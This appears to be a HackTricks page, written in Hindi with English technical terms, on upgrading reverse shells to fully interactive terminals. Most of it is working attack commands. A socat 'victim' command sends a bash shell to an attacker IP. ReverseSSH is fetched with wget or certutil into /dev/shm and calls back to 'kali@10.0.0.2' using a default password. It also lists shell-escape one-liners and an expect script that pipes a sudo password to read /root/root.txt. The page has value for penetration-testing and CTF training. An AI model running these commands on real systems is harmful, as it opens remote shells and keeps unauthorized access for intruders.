# Full TTYs

{{#include ../../banners/hacktricks-training.md}}

## Full TTY

`/etc/shells` valid login-shell pathnames को सूचीबद्ध करता है और कुछ programs द्वारा consult किया जाता है; PTY allocate करने के लिए यह universal prerequisite नहीं है।<sup>[[3]](#references)[[4]](#references)</sup> यदि `pkexec` जैसा कोई program `SHELL` को `The value for the SHELL variable was not found in the /etc/shells file` संदेश के साथ reject करता है, तो सुनिश्चित करें कि exact shell path (उदाहरण के लिए, `/bin/bash`) `/etc/shells` में मौजूद हो।<sup>[[10]](#references)</sup> नीचे दिया गया `CTRL+Z`/`fg` recovery sequence Bash job control का उपयोग करता है; यदि current shell Bash नहीं है, तो इस sequence का उपयोग करने से पहले Bash शुरू करें।<sup>[[7]](#references)</sup>

#### Python

Python का `pty.spawn` current process के standard input, output और error streams से connected program शुरू करता है, जिससे इस session में Bash को pseudo-terminal मिलता है।<sup>[[4]](#references)</sup>
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
> [!TIP]
> आप **`stty -a`** चलाकर **rows** और **columns** की **number** प्राप्त कर सकते हैं; `-a` सभी वर्तमान terminal settings प्रिंट करता है। Command का output terminal-specific होता है, इसलिए current session द्वारा रिपोर्ट किए गए values का उपयोग करें।<sup>[[11]](#references)</sup>

#### script

`script` utility एक terminal session को record करती है; यहाँ `/dev/null` typescript को discard करता है, `-q` start और completion messages को suppress करता है, और `-c` default shell के बजाय Bash चलाता है।<sup>[[5]](#references)</sup>
```bash
script /dev/null -qc /bin/bash #/dev/null is to not store anything
```
किसी भी PTY-spawn method के बाद, Netcat session को suspend करें और local raw mode के साथ उसे restore करें, फिर remote terminal environment और dimensions सेट करें:
```bash
(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```
#### socat

The listener वर्तमान terminal को raw mode में उपयोग करता है, local echo को disabled रखता है और port 4444 पर TCP connections स्वीकार करता है। Victim command एक pty allocate करता है, stderr को जोड़ता है, एक session बनाता है, SIGINT को forward करता है और sane terminal settings लागू करता है; यदि child को controlling terminal की आवश्यकता हो, तो `ctty` जोड़ें।<sup>[[6]](#references)</sup>
```bash
#Listener:
socat file:`tty`,raw,echo=0 tcp-listen:4444

#Victim:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```
### **Shell spawn करें**

- `python -c 'import pty; pty.spawn("/bin/sh")'`
- `echo os.system('/bin/bash')`
- `/bin/sh -i`
- `script -qc /bin/bash /dev/null`
- `perl -e 'exec "/bin/sh";'`
- perl: `exec "/bin/sh";`
- ruby: `exec "/bin/sh"`
- lua: `os.execute('/bin/sh')`
- IRB: `exec "/bin/sh"`
- vi: `:!bash`
- vi: `:set shell=/bin/bash:shell`
- nmap (पुराने versions जिनमें `--interactive` है): `!sh`

Nmap escape version-specific है: बाद के releases में Nmap ने अपना `--interactive` mode हटा दिया, इसलिए `!sh` केवल पुराने versions पर लागू होता है।<sup>[[13]](#references)</sup>

## ReverseSSH

**interactive shell access**, साथ ही **file transfers** और **port forwarding** के लिए एक सुविधाजनक तरीका, statically-linked ssh server [ReverseSSH](https://github.com/Fahrj/reverse-ssh) को target पर डालना है।<sup>[[1]](#references)</sup>

नीचे project के published UPX-compressed binary के साथ `x86` का एक उदाहरण दिया गया है। अन्य architectures या release artifacts के लिए, navigation के रूप में [releases page](https://github.com/Fahrj/reverse-ssh/releases/latest/) का उपयोग करें।<sup>[[1]](#references)</sup>

1. Incoming SSH connection प्राप्त करने के लिए local host को तैयार करें। Listener mode में, `-l` listener को enable करता है और `-p 4444` उस port को select करता है जिस पर यह target का connection accept करता है।<sup>[[1]](#references)</sup>
```bash
# Drop it via your preferred way, e.g.
wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh

/dev/shm/reverse-ssh -v -l -p 4444
```
- (2a) Linux target। उसी `upx_reverse-sshx86` artifact को `/dev/shm/reverse-ssh` में Transfer करें और उसे executable बनाएं। Target का `-p 4444` ऊपर दिए गए listener port को चुनता है, और `kali@10.0.0.2` home से connect करने के लिए उपयोग किए जाने वाले account और host को प्रदान करता है।<sup>[[1]](#references)</sup>
```bash
/dev/shm/reverse-ssh -p 4444 kali@10.0.0.2
```
- (2b) Windows target. Full interactive PowerShell के लिए Windows 10 build 17763 आवश्यक है; [project README](https://github.com/Fahrj/reverse-ssh#features) देखें।<sup>[[1]](#references)</sup>
```bash
# Drop it via your preferred way, e.g.
certutil.exe -f -urlcache https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86.exe reverse-ssh.exe

reverse-ssh.exe -p 4444 kali@10.0.0.2
```
Windows example में `certutil` के साथ `-f -urlcache` का उपयोग किया गया है; Microsoft `-f` को URL fetch को force करने के रूप में document करता है और बताता है कि उपलब्ध parameters version के अनुसार अलग-अलग हो सकते हैं, इसलिए यदि यह form उपलब्ध न हो तो `certutil -?` जांचें।<sup>[[12]](#references)</sup>

- Reverse connection सफल होने के बाद, ReverseSSH का reverse-mode listener डिफ़ॉल्ट रूप से port `8888` पर bind होता है (या `-b` के साथ दिए गए value पर), और incoming connections डिफ़ॉल्ट password `letmeinbrudipls` के साथ किसी भी username को accept करते हैं। Remote shell उस account के privileges के साथ चलता है जिसने `reverse-ssh(.exe)` launch किया था।<sup>[[1]](#references)</sup>
```bash
# Interactive shell access
ssh -p 8888 127.0.0.1

# Bidirectional file transfer
sftp -P 8888 127.0.0.1
```
## Penelope

[Penelope](https://github.com/brightio/penelope) Unix-like reverse shells को स्वचालित रूप से PTY में upgrade करता है, Unix-like terminals का आकार बदलता है, और shell interactions को log करता है; Windows shells के लिए यह readline प्रदान करता है, लेकिन real-time terminal resizing नहीं।<sup>[[2]](#references)</sup>

डिफ़ॉल्ट रूप से `penelope` को `0.0.0.0:4444` पर listen करने के लिए चलाएँ; इसके बाद आने वाले Unix-like shells को स्वचालित रूप से upgrade और log किया जा सकता है।<sup>[[2]](#references)</sup>

![Penelope आने वाले shell को handle और upgrade करते हुए](https://github.com/user-attachments/assets/27ab4b3a-780c-4c07-a855-fd80a194c01e)

## No TTY

यदि किसी कारण से आप full TTY प्राप्त नहीं कर सकते, तो भी आप उन **programs के साथ interact कर सकते हैं** जो user input की अपेक्षा करते हैं। निम्नलिखित उदाहरण में, Expect `sudo` को spawn करता है, उसके password prompt की प्रतीक्षा करता है, password भेजता है, और `interact` के साथ control वापस करता है; `sudo -S` अपना password standard input से पढ़ता है। इसका उपयोग केवल अधिकृत lab में करें और वास्तविक credentials को shell history या source files में रखने से बचें।<sup>[[8]](#references)[[9]](#references)</sup>
```bash
expect -c 'spawn sudo -S cat "/root/root.txt";expect "*password*";send "<THE_PASSWORD_OF_THE_USER>";send "\r\n";interact'
```
## References

- [1] [ReverseSSH - CTFs आदि के लिए reverse shell functionality वाला statically-linked ssh server](https://github.com/Fahrj/reverse-ssh)
- [2] [Penelope - जीवन को आसान बनाने के लिए कुछ चीज़ों को automate करने वाला Shell handler](https://github.com/brightio/penelope)
- [3] [shells(5) — Linux manual पृष्ठ](https://man7.org/linux/man-pages/man5/shells.5.html)
- [4] [Python `pty` — Python documentation](https://docs.python.org/3/library/pty.html)
- [5] [script(1) — Linux manual पृष्ठ](https://man7.org/linux/man-pages/man1/script.1.html)
- [6] [socat(1) — Linux manual पृष्ठ](https://man7.org/linux/man-pages/man1/socat.1.html)
- [7] [Bash Reference Manual — Job Control](https://www.gnu.org/s/bash/manual/bash.html)
- [8] [sudo(8) — Linux manual पृष्ठ](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [9] [expect(1) — Linux manual पृष्ठ](https://man7.org/linux/man-pages/man1/expect.1.html)
- [10] [pkexec.c](https://github.com/polkit-org/polkit/blob/main/src/programs/pkexec.c)
- [11] [stty(1) — Linux manual पृष्ठ](https://man7.org/linux/man-pages/man1/stty.1.html)
- [12] [certutil](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil)
- [13] [Nmap परिवर्तन लॉग](https://nmap.org/changelog.html)
{{#include ../../banners/hacktricks-training.md}}
